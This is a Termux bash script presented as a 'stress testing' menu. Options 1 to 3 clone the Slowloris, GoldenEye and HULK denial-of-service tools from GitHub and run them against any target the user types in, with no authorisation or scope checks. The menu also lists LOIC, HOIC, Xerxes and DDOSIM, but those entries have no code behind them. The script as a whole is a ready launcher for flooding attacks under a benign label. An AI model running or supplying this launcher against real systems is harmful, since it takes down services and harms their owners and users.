#!/data/data/com.termux/files/usr/bin/bash
# Filename: stress_testing.sh

stress_testing() {
    clear
    echo -e "${RED}"
    cat << "EOF"
┌─┐┬─┐┌─┐┌─┐  ┌─┐┌─┐┬─┐┌─┐┬  ┌─┐┌┬┐┌─┐
├─┘├┬┘├┤ ├─┘  │  ├─┤├┬┘├┤ │  ├┤  │ │ │
┴  ┴└─└─┘┴    └─┘┴ ┴┴└─└─┘┴─┘└─┘ ┴ └─┘
EOF
    echo -e "${RESET}"
    
    echo -e "${GREEN}[1]${NC}  Slowloris"
    echo -e "${GREEN}[2]${NC}  GoldenEye"
    echo -e "${GREEN}[3]${NC}  HULK"
    echo -e "${GREEN}[4]${NC}  LOIC"
    echo -e "${GREEN}[5]${NC}  HOIC"
    echo -e "${GREEN}[6]${NC}  Xerxes"
    echo -e "${GREEN}[7]${NC}  DDOSIM"
    echo -e "${GREEN}[8]${NC}  GoBack"
    
    read -p "Select tool: " tool
    
    case $tool in
        1)
            echo -e "${YELLOW}[*] Slowloris DoS${RESET}"
            git clone https://github.com/gkbrk/slowloris.git
            cd slowloris
            read -p "Target: " target
            read -p "Port (default 80): " port
            port=${port:-80}
            python slowloris.py $target -p $port
            ;;
        2)
            echo -e "${YELLOW}[*] GoldenEye HTTP DoS${RESET}"
            git clone https://github.com/jseidl/GoldenEye.git
            cd GoldenEye
            read -p "URL: " url
            python goldeneye.py $url
            ;;
        3)
            echo -e "${YELLOW}[*] HULK DoS Tool${RESET}"
            git clone https://github.com/grafov/hulk.git
            cd hulk
            read -p "URL: " url
            python hulk.py $url
            ;;
        8) return ;;
        *) echo "Invalid option" ;;
    esac
}
